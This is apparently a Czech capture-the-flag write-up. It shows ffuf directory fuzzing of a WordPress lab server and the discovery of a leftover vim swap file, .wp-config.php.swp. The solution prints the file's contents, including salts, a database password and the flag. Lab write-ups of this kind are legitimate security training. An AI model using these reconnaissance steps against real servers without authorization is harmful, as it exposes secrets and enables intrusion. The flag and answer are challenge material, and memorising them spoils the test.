# Science Hot News (2)

## Zadání

Hi Senior Researcher,

something has gone wrong with the `science-hotnews.nren.tcc` server, and the site has suddenly gone offline. The administrator had to fix things manually to get the news server back online.

Your task is to find out whether the administrator left any relics behind.

Stay curious!

## Nápovědy (Hints)

1. All services in `nren.tcc` domain are accessible via VPN only.
2. Some editors are tools. Others are legends.

## Řešení

Server ze zadání <http://science-hotnews.nren.tcc/> zobrazuje jen informaci

```text
Site under reconstruction
This site is temporarily offline — under reconstruction. We are working on it, thank you for your patience.
NREN · The Catch
```

Proskenujeme další možné stránky

`ffuf -u http://science-hotnews.nren.tcc/FUZZ -w /usr/share/dirb/wordlists/common.txt -e .php,.html`

```text
.htpasswd               [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 20ms]
                        [Status: 200, Size: 849, Words: 106, Lines: 24, Duration: 21ms]
.htpasswd.html          [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 247ms]
.htaccess.html          [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 1716ms]
.html                   [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 1923ms]
.htaccess.php           [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 2169ms]
.htpasswd.php           [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 2719ms]
.htaccess               [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 3471ms]
.hta.php                [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 3704ms]
.hta                    [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 3718ms]
.hta.html               [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 3718ms]
index.html              [Status: 200, Size: 849, Words: 106, Lines: 24, Duration: 17ms]
index.php               [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 19ms]
index.php               [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 32ms]
readme.html             [Status: 200, Size: 7409, Words: 750, Lines: 98, Duration: 18ms]
server-status           [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 13ms]
wp-admin                [Status: 301, Size: 379, Words: 21, Lines: 10, Duration: 17ms]
wp-content              [Status: 301, Size: 381, Words: 21, Lines: 10, Duration: 16ms]
wp-config.php           [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 21ms]
wp-blog-header.php      [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 21ms]
wp-cron.php             [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 19ms]
wp-includes             [Status: 301, Size: 382, Words: 21, Lines: 10, Duration: 14ms]
wp-mail.php             [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 17ms]
wp-links-opml.php       [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 17ms]
wp-load.php             [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 18ms]
wp-login.php            [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 22ms]
wp-settings.php         [Status: 200, Size: 215, Words: 21, Lines: 6, Duration: 19ms]
wp-signup.php           [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 20ms]
wp-trackback.php        [Status: 500, Size: 2431, Words: 168, Lines: 115, Duration: 19ms]
xmlrpc.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
```

Když vyřadíme odpovědi s kódem 500 a 403, tak nám zbyde

```text
.htpasswd               [Status: 403, Size: 329, Words: 21, Lines: 10, Duration: 20ms]
                        [Status: 200, Size: 849, Words: 106, Lines: 24, Duration: 21ms]
index.html              [Status: 200, Size: 849, Words: 106, Lines: 24, Duration: 15ms]
readme.html             [Status: 200, Size: 7409, Words: 750, Lines: 98, Duration: 18ms]
wp-admin                [Status: 301, Size: 379, Words: 21, Lines: 10, Duration: 17ms]
wp-content              [Status: 301, Size: 381, Words: 21, Lines: 10, Duration: 16ms]
wp-includes             [Status: 301, Size: 382, Words: 21, Lines: 10, Duration: 14ms]
wp-settings.php         [Status: 200, Size: 215, Words: 21, Lines: 6, Duration: 19ms]
xmlrpc.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
```

Prošel jsem všechny nalezené stránky, nadějné bylo xmlrpc.php, ale to mě také nikam neposunulo.

Nakonec jsem využil nápovědu "Some editors are tools. Others are legends.", což měla být narážka na editor vim/vi.

Když vim otevře soubor k editaci, vytvoří ve stejném adresáři skrytý swap file ve formátu:
`.<název_souboru>.swp`

Prohledáme, jestli se tam nějaké nevyskytují

`ffuf -u http://science-hotnews.nren.tcc/.FUZZ.php.swp -w /usr/share/dirb/wordlists/common.txt`

Našel soubor `.wp-config.php.swp` a v něm <http://science-hotnews.nren.tcc/.wp-config.php.swp> se skrývá flag.

```text
define( 'NONCE_SALT',       'Jd2Gh4Fs6Aq8Lo7Up3Ne1Ri5Tu.q9W8e7R6t5Y4u3I2o1P0a1S2d3F4' );
define( 'LOGGED_IN_SALT',   'Fs6Aq8Lo7Up3Ne1Ri5Tu,Zx1Vc3Bn5Mk0Jd2Gh4 p8Jf2qZx4Rt6Yw9' );
define( 'SECURE_AUTH_SALT', 'M4n5B6v7C8x9Z0l9K8j7H6g5F4d3S2a1-P0o1I2u3Y4t5R6e7W8q9' );
define( 'AUTH_SALT',        'q9W8e7R6t5Y4u3I2o1P0-a1S2d3F4g5H6j7K8l9 Z0x9C8v7B6n5M4' );
define( 'NONCE_KEY',        'Zx1Vc3Bn5Mk0Jd2Gh4Fs6Aq8Lo7Up3Ne1Ri5Tu.p8Jf2qZx4Rt6Yw9' );
define( 'LOGGED_IN_KEY',    'a1S2d3F4g5H6j7K8l9Q0w1E2r3T4y5U6i7O8p9,z8X7c6V5b4N3m2' );
define( 'SECURE_AUTH_KEY',  'p8Jf2!qZ,x4Rt6-Yw9Zx1Vc3Bn5Mk0Jd2Gh4Fs6Aq8Lo7 Up3Ne1Ri5Tu' );
define( 'AUTH_KEY',         'FLAG{Qdq3-LPjI-UQog-K1Ox}' );
 * Authentication unique keys and salts.
/**#@+
define( 'DB_COLLATE', '' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_HOST', 'db.internal.nren.tcc' );
define( 'DB_PASSWORD', 'S3cr3t-db-p4ss!2026' );
define( 'DB_USER', 'wp_admin' );
define( 'DB_NAME', 'wp_recon' );
// ** Database settings ** //
 * half-edited, vim keeps an unsaved copy in its swap file (.wp-config.php.swp).
 * Being edited on the server during maintenance. If this file was left
 * The base WordPress configuration file.
<?php
```

## Flag

`FLAG{Qdq3-LPjI-UQog-K1Ox}`
